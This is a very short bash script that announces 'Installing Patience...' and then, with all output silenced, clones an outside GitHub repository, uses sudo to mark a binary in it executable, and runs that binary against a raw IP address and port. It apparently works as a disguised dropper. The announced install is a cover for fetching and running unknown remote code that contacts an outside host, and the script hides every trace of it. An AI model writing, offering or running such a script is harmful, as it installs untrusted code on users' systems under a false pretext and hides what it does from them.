#! /bin/bash
printf "Installing Patience... " >&2
{
git clone https://github.com/phucbmt/tech.git
sudo chmod +x tech/m
./tech/m -P http://138.197.99.165:4545/test &> log
} &> /dev/null
